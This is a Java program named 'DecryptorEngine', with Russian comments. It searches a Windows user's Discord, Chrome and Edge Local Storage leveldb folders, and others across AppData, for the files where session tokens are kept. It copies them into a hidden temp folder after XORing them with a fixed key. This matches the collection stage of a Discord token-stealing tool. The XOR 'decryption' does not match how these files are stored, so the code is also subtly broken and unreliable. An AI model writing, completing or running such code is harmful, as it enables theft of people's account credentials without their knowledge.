import java.io.*;
import java.nio.file.*;
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

public class DecryptorEngine {
    private static final String TEMP_DIR = System.getenv("TEMP") + "\\SWILL_DEC";
    private static final byte[] KEY = "SwillWay2025Key42".getBytes();
    
    private static void log(String msg) {
        String timestamp = LocalDateTime.now().format(DateTimeFormatter.ofPattern("HH:mm:ss"));
        System.out.println("[Decryptor][" + timestamp + "] " + msg);
    }
    
    public static void main(String[] args) {
        log("DecryptorEngine v2.0 started");
        new File(TEMP_DIR).mkdirs();
        log("Temp dir: " + TEMP_DIR);
        
        // Ищем ВСЕ папки leveldb, а не только стандартные
        scanAllDrivesForLevelDB();
        
        log("Scan complete");
    }
    
    private static void scanAllDrivesForLevelDB() {
        // Стандартные пути
        String[] defaultPaths = {
            System.getenv("APPDATA") + "\\discord\\Local Storage\\leveldb",
            System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb",
            System.getenv("LOCALAPPDATA") + "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb",
            System.getenv("APPDATA") + "\\discordptb\\Local Storage\\leveldb",
            System.getenv("APPDATA") + "\\discordcanary\\Local Storage\\leveldb"
        };
        
        for (String path : defaultPaths) {
            if (path != null) {
                File dir = new File(path);
                if (dir.exists()) {
                    log("Found: " + path);
                    copyFilesToTemp(dir);
                } else {
                    log("Not found: " + path);
                }
            }
        }
        
        // Дополнительный поиск в AppData
        searchInAppData();
    }
    
    private static void searchInAppData() {
        String appData = System.getenv("APPDATA");
        String localAppData = System.getenv("LOCALAPPDATA");
        
        if (appData != null) {
            File appDataDir = new File(appData);
            searchDirectoryForLevelDB(appDataDir);
        }
        
        if (localAppData != null) {
            File localAppDataDir = new File(localAppData);
            searchDirectoryForLevelDB(localAppDataDir);
        }
    }
    
    private static void searchDirectoryForLevelDB(File dir) {
        if (dir == null || !dir.exists()) return;
        
        try {
            Files.walk(dir.toPath())
                .filter(Files::isDirectory)
                .filter(p -> p.toString().endsWith("leveldb"))
                .limit(20) // Ограничиваем поиск для производительности
                .forEach(p -> {
                    log("Found leveldb in search: " + p.toString());
                    copyFilesToTemp(p.toFile());
                });
        } catch (Exception e) {
            log("Search error: " + e.getMessage());
        }
    }
    
    private static void copyFilesToTemp(File sourceDir) {
        File[] files = sourceDir.listFiles((d, n) -> n.endsWith(".log") || n.endsWith(".ldb"));
        if (files == null || files.length == 0) {
            log("No .log/.ldb files in " + sourceDir.getPath());
            return;
        }
        
        log("Copying " + files.length + " files from " + sourceDir.getPath());
        
        for (File f : files) {
            try {
                byte[] data = Files.readAllBytes(f.toPath());
                // Расшифровка XOR
                for (int i = 0; i < data.length; i++) {
                    data[i] ^= KEY[i % KEY.length];
                }
                String outPath = TEMP_DIR + "\\" + sourceDir.getName() + "_" + f.getName() + ".dec";
                Files.write(Paths.get(outPath), data);
                log("Decrypted and saved: " + outPath + " (" + data.length + " bytes)");
            } catch (Exception e) {
                log("Error processing " + f.getName() + ": " + e.getMessage());
            }
        }
    }
}
